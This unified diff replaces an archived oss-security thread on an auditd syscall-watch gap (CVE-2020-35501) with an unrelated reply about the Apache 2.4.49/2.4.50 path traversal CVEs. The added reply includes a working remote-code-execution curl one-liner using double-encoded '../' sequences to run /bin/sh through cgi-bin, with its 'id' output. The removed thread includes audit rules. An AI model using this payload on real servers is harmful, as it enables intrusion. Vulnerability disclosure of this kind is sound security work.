@@ -1,118 +1,52 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/02/18/4
-Message-ID: <E42466DE-9ABE-4996-9F6B-D82DA14396B9@secuinfra.com>
-Date: Thu, 18 Feb 2021 15:52:54 +0000
-From: Felix Kosterhon <felix.kosterhon@...uinfra.com>
-To: Steve Grubb <sgrubb@...hat.com>, "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: Re: Vulnerability in the Linux Audit Framework Auditd
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/08/1
+Message-ID: <0d7be57c-87ae-c4aa-7207-2337c1a51c6d@rs-labs.com>
+Date: Fri, 8 Oct 2021 03:18:14 +0200
+From: Roman Medina-Heigl Hernandez <roman@...labs.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE-2021-42013: Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of CVE-2021-41773)
 Content-Type: text/plain; charset=utf-8
 
-Hello Mr. Grubb,
- 
-thank you for your insight.
-First and foremost we would like to clarify that our intent is not to put blame on anyone but to improve the level of security for the affected systems and the organisations utilising Auditd.
-According to the rules.conf manual page, file-watch rules are meant to monitor any accesses to files based on their permission level.
-For the syscalls mentioned in this report this is not the case.
- 
-RedHat Inc. shares our perspective on this issue and has assigned a CVE for the vulnerability. Additionally they informed us that they will work together with the Upstream Linux Kernel Developers on behalf of fixing this issue.
- 
-Furthermore we were asked by RedHat Inc. to share our findings via this mailing list.
- 
-Kind regards,
- 
-Felix Kosterhon
-Cyber Defense Analyst
-SECUINFRA GmbH, Germany
+Hi,
 
-﻿Am 18.02.21, 15:32 schrieb "Steve Grubb" <sgrubb@...hat.com>:
+I posted RCE exploit for this (it works for both CVEs: 41773 & 42013)
+and some other details regarding requirements / exploitability, which
+you may find useful at:
 
-    Hello,
-
-    I normally do not comment on security announcements, but this needs some 
-    fixing...
-
-    On Thursday, February 18, 2021 5:15:20 AM EST Felix Kosterhon wrote:
-    > my name is Felix Kosterhon and i am Cyber Defense Analyst at SECUINFRA
-    > GmbH, Germany.
-    > 
-    > We discovered a security vulnerability in the Linux Audit Framework
-    > (Auditd).
-
-    Before people start asking for an updated audit package, auditd is not 
-    responsible for this. The Linux Kernel is where any issue might lie. Blaming 
-    auditd  is like saying syslog has a security problem because a login was not 
-    recorded.
-
-    > During our research we discovered that the usage of a certain
-    > open-syscall (open_by_handle_at) is not covered by the current file watch
-    > implementation of Auditd.
-
-    Where to begin? name_to_handle_at/open_by_handle_at work together. 
-    name_to_handle_at is the syscall that would have the path name and returns a 
-    handle. open_by_handle_at() takes the handle and makes a descriptor. That 
-    means open_by_handle_at() has no idea what the path might be. All it has is 
-    numbers. So, if there was going to be a watch placed, it would be more 
-    meaningful on name_to_handle_at(). Anyone concerned can place a syscall audit 
-    rule on name_to_handle_at() like this:
-
-    -a always,exit -F arch=b32 -S name_to_handle_at  -F auid>=1000 -F auid!=unset
-    -a always,exit -F arch=b64 -S name_to_handle_at -F auid>=1000 -F auid!=unset
-
-    But then...what might use this? All the references I can find seem to 
-    associate this syscall with NFS. And if that is the case, the audit system 
-    doesn't really support remote file systems. Sometimes it does. But that is 
-    more likely accidental than anything planned.
-
-    But this does not stop anyone with admin privileges from using the syscall 
-    pair locally.
-
-    -Steve
-
-    > This allows a local attacker with elevated
-    > privileges (CAP_DAC_READ_SEARCH capability) to read and modify files
-    > without being noticed by the implemented Auditd file watches.
-    >
-    > We disclosed our finding to RedHat, Inc. in November and it will be
-    > published today, Feb 18, under CVE-2020-35501. As suggested by RedHat,
-    > Inc., we want to inform you about this security flaw. If you have any
-    > further questions, we are happy to help you.
-    > 
-    > We would also like to subscribe to your mailing list to stay informed about
-    > current security topics.
-    > 
-    > Best Regards,
-    > 
-    > 
-    > 
-    > Felix Kosterhon
-    > 
-    > Cyber Defense Analyst
-    > 
-    > 
-    > 
-    > 
-    > 
-    > SECUINFRA GmbH
-    > 
-    > Münchener Straße 36
-    > 
-    > 60329 Frankfurt/Main
-    > 
-    > 
-    > 
-    > Mobile:  +49 151 18975666
-    > 
-    > 
-    > 
-    > felix.kosterhon@...uinfra.com
-    > 
-    > www.secuinfra.com
-    > 
-    > 
-    > 
-    > Follow us on XING.
+https://twitter.com/roman_soft/status/1446252280597078024
 
 
+Excerpt (for the sake of ml-archive):
 
+RCE exploit both for Apache 2.4.49 (CVE-2021-41773) and 2.4.50
+(CVE-2021-42013): root@...06:~# curl
+'http://192.168.0.191/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
+--data 'echo Content-Type: text/plain; echo; id' uid=1(daemon)
+gid=1(daemon) groups=1(daemon)
+
+
+Cheers.
+
+-r
+
+
+El 07/10/2021 a las 17:24, Stefan Eissing escribió:
+> Severity: critical
+>
+> Description:
+>
+> It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.  
+>
+> If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.
+>
+> This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.
+>
+> Credit:
+>
+> Reported by Juan Escobar from Dreamlab Technologies, Fernando Muñoz from NULL Life CTF Team, and Shungo Kumasaka
+>
+-- 
+Saludos,
+-Román
 
 
